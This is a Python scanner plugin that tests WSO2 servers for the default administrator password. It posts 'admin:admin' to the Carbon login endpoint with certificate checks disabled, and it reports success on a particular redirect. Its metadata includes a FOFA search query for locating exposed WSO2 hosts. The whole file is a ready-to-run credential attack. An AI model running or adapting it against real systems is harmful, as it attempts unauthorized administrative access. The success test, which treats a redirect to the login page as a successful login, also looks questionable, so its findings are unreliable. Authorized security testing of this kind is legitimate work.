#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   'WSO2默认口令',

      'level'     :   'high',

      'FOFA'      :   '"WSO2"',

      'author'    :   'ppxfx',

      'ifbug'     :   False,

      'create_time':  '2023/11/29',
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = '/carbon/admin/login_action.jsp'
  data = 'username=admin&password=admin'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.post(url=url1,headers=headers,data=data,timeout=5,verify=False,allow_redirects=False)
    if res.status_code == 302 and '/carbon/admin/login.jsp' in res.headers['Location']:
      ret['huixian'] = 'admin:admin'
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret